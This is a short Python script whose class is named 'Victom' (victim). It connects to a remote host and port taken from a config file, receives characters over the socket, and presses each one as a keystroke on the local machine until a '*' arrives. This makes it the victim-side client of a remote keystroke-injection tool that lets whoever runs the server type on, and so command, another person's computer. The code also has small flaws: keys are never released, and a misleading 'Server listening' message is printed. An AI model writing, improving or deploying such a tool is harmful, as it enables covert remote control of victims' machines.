import json
import socket
from pathlib import Path
from pynput import mouse, keyboard
from pynput.keyboard import Key, Controller
import threading, queue


class Victom:
    def __init__(self):

        self.keyboard = Controller()

        config_path = Path(__file__).with_name('config.json')
        with config_path.open('r', encoding='utf-8') as f:
            config = json.load(f)

        HOST = config['HOST']
        PORT = config['PORT']

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
            c.connect((HOST, PORT))

            print(f"Server listening on {HOST}:{PORT}")

            while True:
                response = c.recv(1).decode('utf-8')
                print(response)
                if response != '*':
                    self.keyboard.press(response)
                else:
                    break


if __name__ == "__main__":
    V = Victom()